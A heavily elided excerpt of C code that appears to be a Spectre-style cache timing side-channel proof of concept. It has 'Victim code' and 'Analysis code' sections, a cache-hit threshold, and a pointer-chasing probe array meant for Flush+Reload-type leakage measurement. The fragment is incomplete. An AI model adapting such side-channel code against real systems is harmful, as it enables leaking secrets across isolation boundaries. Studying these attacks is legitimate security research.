...
#define CACHE_LINE_SIZE 64// 8 * 64bits 
/********************************************************************
Victim code.
********************************************************************/
...
uint8_t unused2[64];
uint64_t array2[64*64*8];// 64 sets, 8way, 64byte cacheline
...
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 38 /* assume cache hit if time <= threshold */
...
/*create pointer chasing chain in probe array with stride offset decides where to start
    ...
    */
    ...
    void* last;
	array2[offset + CACHE_LINE_SIZE*64]= (void*) (& array2[ (perm[0]+1)*stride + offset + CACHE_LINE_SIZE*64]);
	for(int i=0; i < 5; i++){
		array2[(perm[i]+1)*stride + offset + CACHE_LINE_SIZE*64]= (void*) (& array2[(perm[i+1]+1)*stride + offset + CACHE_LINE_SIZE*64]);
	}
